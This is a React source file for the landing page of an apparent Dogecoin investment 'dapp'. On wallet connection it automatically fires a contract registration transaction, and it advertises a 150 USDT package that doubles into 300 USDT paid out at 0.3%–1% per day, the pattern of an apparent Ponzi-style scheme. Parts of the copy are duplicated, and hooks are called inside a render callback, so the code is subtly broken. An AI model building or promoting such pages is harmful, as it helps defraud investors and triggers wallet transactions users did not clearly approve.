import { useNavigate } from "react-router-dom";
import { ConnectButton } from '@rainbow-me/rainbowkit';
import "./index.css";
import { useContract } from '../../hooks/useContract';
import { useEffect, useRef } from 'react';
import { useAccount } from 'wagmi';

export default function Home() {
  const navigate = useNavigate();
  const { address } = useAccount();
  const { register, registerData, isRegistering, registerSuccess, registerError } = useContract();
  const hasAttemptedRegistration = useRef(false);

  // 格式化地址显示
  const formatAddress = (addr: string | undefined) => {
    if (!addr) return '未登录';
    return `${addr.slice(0, 4)}...${addr.slice(-4)}`;
  };

  // 检查用户是否已注册
  const checkRegistrationStatus = (address: string) => {
    return localStorage.getItem(`registered_${address}`);
  };

  // 标记用户已注册
  const markAsRegistered = (address: string) => {
    localStorage.setItem(`registered_${address}`, 'true');
  };

  return (
    <div className="home-main-container">
      <div className="home-flex-row-a">
        <div className="home-group">
          <div className="home-dogecoin" />
          <span className="home-dogecoin-1">Dogecoin</span>
        </div>
        <div className="home-group-2">
          <ConnectButton.Custom>
            {({
              account,
              chain,
              openAccountModal,
              openConnectModal,
              mounted,
            }) => {
              const ready = mounted;
              const connected = ready && account && chain;

              // 监听连接状态和注册
              useEffect(() => {
                const attemptRegistration = async () => {
                  if (connected && 
                      address && 
                      !hasAttemptedRegistration.current && 
                      !checkRegistrationStatus(address)) {
                    hasAttemptedRegistration.current = true;
                    try {
                      console.log('钱包已连接，尝试注册...');
                      const tx = await register();
                      console.log('注册交易已发送:', tx);
                      markAsRegistered(address);
                    } catch (err) {
                      console.error('注册失败:', err);
                      hasAttemptedRegistration.current = false;
                    }
                  }
                };

                attemptRegistration();
              }, [connected, address]);

              // 监听注册结果
              useEffect(() => {
                if (registerSuccess && address) {
                  console.log('注册成功:', registerData);
                  markAsRegistered(address);
                }
                if (registerError) {
                  console.error('注册错误:', registerError);
                  hasAttemptedRegistration.current = false;
                }
              }, [registerSuccess, registerError, registerData, address]);

              return (
                <div
                  {...(!ready && {
                    'aria-hidden': true,
                    style: {
                      opacity: 0,
                      pointerEvents: 'none',
                      userSelect: 'none'
                    },
                  })}
                >
                  {(() => {
                    if (!connected) {
                      return (
                        <span 
                          className="home-tyq8-fmo3z"
                          onClick={openConnectModal}
                          style={{ cursor: 'pointer' }}
                        >
                          {isRegistering ? '注册中...' : '未登录'}
                        </span>
                      );
                    }
                    return (
                      <span 
                        className="home-tyq8-fmo3z"
                        onClick={openAccountModal}
                        style={{ cursor: 'pointer' }}
                      >
                        {formatAddress(account.address)}
                      </span>
                    );
                  })()}
                  <div className="home-rectangle" />
                </div>
              );
            }}
          </ConnectButton.Custom>
        </div>
        <div 
          className="home-group-3" 
          onClick={() => navigate("/item")}
          style={{ cursor: 'pointer' }}
        />
      </div>
      <div className="home-group-4">
        <div className="home-group-5">
          <span className="home-welcome-to">Welcome to</span>
          <div className="home-group-6" />
        </div>
        <span className="home-dogecoin-2025-ecosystem">
          Dogecoin 2025 Ecosystem Blueprint
          <br />
          Reshaping the new ecosystem of crypto value
        </span>
        <div className="home-group-7">
          <div className="home-bitmap" />
          <div className="home-bitmap-8" />
        </div>
        <span className="home-dogecoin-dapp">Dogecoin Dapp</span>
      </div>
      <div className="home-flex-row-ffaa">
        <div className="home-bitmap-9" />
        <div className="home-rectangle-a" />
        <div 
          className="home-rectangle-b"
          onClick={() => navigate("/join")}
          style={{ cursor: 'pointer' }}
        >
          <div className="home-group-c">
            <span className="home-participate-now">Participate Now</span>
            <div className="home-group-d" />
          </div>
        </div>
      </div>
      <div className="home-group-e" />
      <div className="home-flex-row-af">
        <div className="home-bitmap-11">
          <div className="home-rectangle-12" />
        </div>
        <div className="home-bitmap-backup" />
      </div>
      <div className="home-group-13" />
      <div className="home-group-backup">
        <span className="home-goal-planning">Goal planning</span>
        <div className="home-group-5">
          <span className="home-number-one">①</span>
          <span className="home-improve-mining-efficiency">
            {" "}
            Use the second-layer network community revenue incentives to improve
            Dogecoin mining efficiency and user participation.
            <br />
            <br />
          </span>
          <span className="home-number-two">②</span>
          <span className="home-expand-energy-applications">
            {" "}
            Expand the application scenarios of Dogecoin in the energy field by
            relying on the technology of Geometry Energy.
            <br />
            <br />
          </span>
          <span className="home-sustainable-ecological-model">③</span>
          <span className="home-complementary-business">
            {" "}
            Build a sustainable ecological construction model to achieve
            complementary and win-win business between Dogecoin and Geometry
            Energy.
          </span>
        </div>
      </div>
      <div className="home-flex-row-c">
        <div 
          className="home-rectangle-14"
          onClick={() => navigate("/join")}
          style={{ cursor: 'pointer' }}
        >
          <div className="home-group-15">
            <span className="home-participate-now-16">Participate Now</span>
            <div className="home-group-17" />
          </div>
        </div>
        <div className="home-rectangle-18" />
      </div>
      <div className="home-rectangle-19">
        <div className="home-bitmap-1a">
          <div className="home-bitmap-1b" />
          <div className="home-group-1c">
            <span className="home-dogecoin-1d">Dogecoin</span>
            <span className="home-integrate-real-economy">
              Helping digital currency integrate with the real economy
            </span>
          </div>
          <div className="home-mask" />
          <div className="home-group-backup-1e" />
          <div className="home-group-backup-1f" />
          <div className="home-group-backup-20" />
          <div className="home-group-backup-21" />
          <div className="home-group-backup-22" />
          <div className="home-group-23" />
          <div className="home-group-backup-24" />
        </div>
        <div className="home-group-25">
          <span className="home-purchase-amount">
            1. Purchase amount and multiple release
          </span>
          <span className="home-user-purchase">
            (1) The user purchases a DOGE welfare package for 150 USDT
            (approximately RMB 1,000).
            <br />
            <br />
            (2) After purchase, the system will grant you 2 times the asset
            quota, which is 300 USDT of unreleased income.
          </span>
        </div>
        <div className="home-group-26">
          <span className="home-daily-release">
            2. Daily release ratio and DOGE conversion
          </span>
          <div className="home-group-27">
            <span className="home-purchase-amount-limit">
              0.3%~1% of the purchase amount (150 USDT) will be released daily.
              <br />
              <br />
              The released assets can be exchanged for DOGE (Dogecoin) at any
              time.
              <br />
              <br />
              Purchase frequency limit and repeat purchase
            </span>
            <div className="home-flex-column-dd">
              <div className="home-ellipse" />
              <div className="home-ellipse-backup" />
              <div className="home-ellipse-backup-28" />
            </div>
          </div>
        </div>
        <div className="home-group-29">
          <span className="home-purchase-frequency-limit">
            3. Purchase frequency limit and repeat purchase
          </span>
          <span className="home-user-purchase-2a">
            (1) The user purchases a DOGE welfare package for 150 USDT
            (approximately RMB 1,000).
            <br />
            <br />
            (2) After purchase, the system will grant you 2 times the asset
            quota, which is 300 USDT of unreleased income.
          </span>
        </div>
      </div>
      <div className="home-group-2b">
        <div className="home-path" />
        <div className="home-group-2c">
          <div className="home-dogecoin-2d" />
          <span className="home-dogecoin-2e">Dogecoin</span>
        </div>
        <div className="home-group-2f">
          <div className="home-bitmap-30" />
          <div className="home-bitmap-31" />
          <div className="home-bitmap-32" />
          <div className="home-bitmap-33" />
          <div className="home-bitmap-34" />
          <div className="home-bitmap-35" />
        </div>
        <button className="home-dogecoin-all-rights" />
      </div>
      <div className="home-ellipse-36" />
      <div className="home-group-37" />
    </div>
  );
}
